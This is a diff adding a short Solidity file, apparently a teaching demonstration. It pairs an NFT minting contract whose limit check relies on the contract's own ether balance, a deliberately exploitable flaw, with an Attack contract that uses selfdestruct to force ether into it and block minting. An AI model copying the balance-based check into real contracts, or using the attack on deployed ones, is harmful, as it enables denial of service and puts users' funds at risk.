@@ -1,0 +1,33 @@
+// SPDX-License-Identifier: GPL-3.0
+
+pragma solidity >=0.7.0 <0.9.0;
+
+
+contract NFT {
+    uint public reward = 100 ether;
+    uint public maxSupply;
+
+    mapping(uint => address) public isOwner;
+
+    function mint() public payable {
+        require(msg.value == 1 ether, "Must send 1 ether");
+        require(address(this).balance <= reward, "Minting is done!");
+        maxSupply ++;
+
+        isOwner[maxSupply] = msg.sender; 
+
+    }
+
+}
+
+contract Attack {
+    NFT nft;
+
+    constructor(NFT _nft) {
+        nft = _nft;
+    }
+    function attack() public payable {
+        address payable nftAddress = payable(address(nft));
+        selfdestruct(nftAddress);
+    }
+}
